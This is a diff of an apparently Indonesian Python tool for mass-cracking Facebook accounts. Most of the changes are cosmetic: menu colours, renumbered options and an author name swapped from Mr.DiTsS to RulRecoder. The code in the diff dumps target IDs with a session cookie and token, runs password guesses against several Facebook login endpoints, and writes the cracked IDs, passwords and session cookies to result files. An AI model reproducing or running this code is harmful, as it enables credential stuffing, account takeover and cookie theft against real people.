@@ -222,12 +222,12 @@ def menu():
 		login()
 	os.system('clear')
 	banner()
-	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green]{nama}[white]] \n[[cyan]•[white]] Idz Tumbal [white][[green]{uidfb}[white]]""",width=43,title=f"[[green] INFO TUMBAL [/]]",style=f"bold green"))
-	prints(panel(f"""[white][[cyan]1[white]] Crack Publik [[green]  ON[white]] \n[[cyan]2[white]] Crack Massal [white][[green] ON [white]] \n[[cyan]3[white]] Dalam perbaikan [[red] OF [white]]\n[[cyan]4[white]] Dalam perbaikan [white][[red] OF [white]]\n[[cyan]5[white]] logout [white][ [red]hapus cookies [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU HIDANGAN [/]]",style=f"bold white"))
-	print(f"{kun}╭────────────────────────────────────────────{puti}")
-	CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
+	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green]{nama}[white]] \n[[cyan]•[white]] Idz Tumbal [white][[green]{uidfb}[white]]""",width=43,title=f"[[green] INFO TUMBAL [/]]",style=f"bold blue"))
+	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green]  ON[white]] \n[[cyan]02[white]] Crack Massal [white][[green] ON [white]] \n[[cyan]03[white]] Result CP [[red] OF [white]]\n[[cyan]04[white]] Result OK [white][[red] OF [white]]\n[[cyan]{mer}00[white]] logout [white][ [red]hapus cookies [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU CRACK [/]]",style=f"bold blue"))
+	print(f"{biru}╭────────────────────────────────────────────{puti}")
+	CYXIEON_GANTENG = input(f'{biru}└──[{puti} Input menu : ')
 	if CYXIEON_GANTENG in ['01','1']:
-	        idt = input('\n└──[ ID Target : ')
+	        idt = input('\n{biru}└──[{puti} ID Target : ')
 	        dump(idt,"",{"cookie":cok},token)
 	        atur_id()
 	if CYXIEON_GANTENG in ['02','2']:
@@ -236,7 +236,7 @@ def menu():
 	        hasil_cp()
 	elif CYXIEON_GANTENG in ['04','4']:
 	        hasil_ok()
-	elif CYXIEON_GANTENG in ['05','5']:
+	elif CYXIEON_GANTENG in ['00','0']:
             ganti_cokies()
 
 #
@@ -256,7 +256,7 @@ def dump_massal():
 	bilangan = 0
 	for KOTG49H in range(kumpulkan):
 		bilangan+=1
-		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] Mr.DiTsS [/]]",style=f"bold white"))
+		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] RulRecoder [/]]",style=f"bold blue"))
 		Masukan = input(f' Masukin ID Yang Ke  '+str(bilangan)+f' : ')
 		uid.append(Masukan)
 	for user in uid:
@@ -290,7 +290,7 @@ def dump_massal():
 	    except requests.exceptions.ConnectionError:
 	        exit()
 	try:
-	      prints(panel(f"…⁠ᘛ⁠⁐̤⁠ᕐ⁠ᐷ lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]Mr.DiTsS[/]]",style=f"bold white"))
+	      prints(panel(f" lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green] RulRecoder [/]]",style=f"bold blue"))
 	      atur_id()
 	except requests.exceptions.ConnectionError:
 	    exit()
@@ -436,11 +436,11 @@ def atur_id():
 #----------[ MENU-METODE ]----------#
 def atur_method():
 	print("")
-	print(f'{kun}└──[{puti} 01. Validate ')
-	print(f'{kun}└──[{puti} 02. Reguler ')
-	print(f'{kun}└──[{puti} 03. Asyinc ')      
-	print(f"{kun}╭────────────────────────────────────────────{puti}") 
-	CYXIEON_METHODE = input(f'{kun}└──[{puti} Input method : ')
+	print(f'\n{biru}└──[{puti} 01. m.prod.facebook.com [{hijo}Validate{puti}] ')
+	print(f'{biru}└──[{puti} 02. m.facebook.com [{mer}Reguler{puti}] ')
+	print(f'{biru}└──[{puti} 03. mbasic.facebook.com [{kun}Asyinc{puti}] ')      
+	print(f"{biru}╭────────────────────────────────────────────{puti}") 
+	CYXIEON_METHODE = input(f'{hijo}└──[{puti} Input method : ')
 	if CYXIEON_METHODE in ['1','01']:
 	   method.append('validate')  
 	elif CYXIEON_METHODE in ['2','02']:
@@ -449,14 +449,14 @@ def atur_method():
 	   method.append('asyinc')
 	else:
 		method.append('validate')
-	print(f"{kun}╭────────────────────────────────────────────{puti}")
-	print(f'{kun}└──[{puti} Tambahkan pw manual (y/t) ')
-	print(f"{kun}╭────────────────────────────────────────────{puti}") 	
-	passwtamb = input(f'{kun}└──[{puti} Input : ')
+	print(f"{hijo}╭────────────────────────────────────────────{puti}")
+	print(f'{hijo}└──[{puti} Tambahkan pw manual (y/t) ')
+	print(f"{hijo}╭────────────────────────────────────────────{puti}") 	
+	passwtamb = input(f'{hijo}└──[{puti} Input : ')
 	if passwtamb in ['y','Y']:
 		     sandine.append('ya')
-		     print(f"{kun}╭────────────────────────────────────────────{puti}")
-		     sandiku = input(f'{kun}└──[{puti} Input Pw : ')
+		     print(f"{hijo}╭────────────────────────────────────────────{puti}")
+		     sandiku = input(f'{hijo}└──[{puti} Input Pw : ')
 		     sandimu = sandiku.split(',')
 		     for sandixnxx in sandimu:
 		         sandina.append(sandixnxx)		 
@@ -467,9 +467,9 @@ def atur_method():
 #----------[ BAGIAN-WORDLIST ]----------#	
 def passwordlist():
 	global prog,des
-	print(f"{kun}╭────────────────────────────────────────────{puti}")
-	print(f'{kun}└──[{puti} WAITING ')
-	print(f"{kun}─────────────────────────────────────────────{puti}")
+	print(f"{hijo}╭────────────────────────────────────────────{puti}")
+	print(f'{hijo}└──[{puti} WAITING ')
+	print(f"{hijo}─────────────────────────────────────────────{puti}")
 	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -529,10 +529,10 @@ def passwordlist():
 				else:
 				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
 				    
-	print(f"{kun}╭────────────────────────────────────────────{puti}")
-	print(f'{kun}└──[{puti} OK {hijo}: %s'%(ok))
-	print(f'{kun}└──[{puti} CP {kun}: %s'%(cp))
-	print(f"{kun}─────────────────────────────────────────────{puti}")
+	print(f"{hijo}╭────────────────────────────────────────────{puti}")
+	print(f'{hijo}└──[{puti} OK {hijo}: %s'%(ok))
+	print(f'{hijo}└──[{puti} CP {kun}: %s'%(cp))
+	print(f"{hijo}─────────────────────────────────────────────{puti}")
 	
 #----------[ METODE-VALIDATE ]----------#	
 def crackvalidate(idf,pwx,url):
@@ -597,7 +597,6 @@ def crackvalidate(idf,pwx,url):
 				print(f"⌲ Password: {hijo}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
-				print(f"⌲ Mode: Mr.DiTsS|SUCCES ")
 				print(f'{hijo}{ua}')
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
@@ -606,7 +605,6 @@ def crackvalidate(idf,pwx,url):
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
-				print(f"⌲ Mode: Mr.DiTsS|CHEKPOINT ")
 				print(f'{kun}{ua}')
 				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
@@ -765,21 +763,21 @@ def crackasyinc(idf,pwx):
         ok+=1
         coki = po.cookies.get_dict()
         kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-        print(f"{kun}╭────────────────────────────╮{puti}")
+        print(f"{hijo}╭────────────────────────────╮{puti}")
         tree = Tree("")
         tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
         tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
-        print(f"{kun}╰────────────────────────────╯{puti}")
+        print(f"{hijo}╰────────────────────────────╯{puti}")
         prints(tree)
         open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
         open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
         break	
       elif "checkpoint" in po.cookies.get_dict().keys():
-        print(f"{kun}╭────────────────────────────╮{puti}")
+        print(f"{hijo}╭────────────────────────────╮{puti}")
         tree = Tree("")
         tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
         tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
-        print(f"{kun}╰────────────────────────────╯{puti}")
+        print(f"{hijo}╰────────────────────────────╯{puti}")
         prints(tree)
         open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         akune.append(idf+'|'+pw)
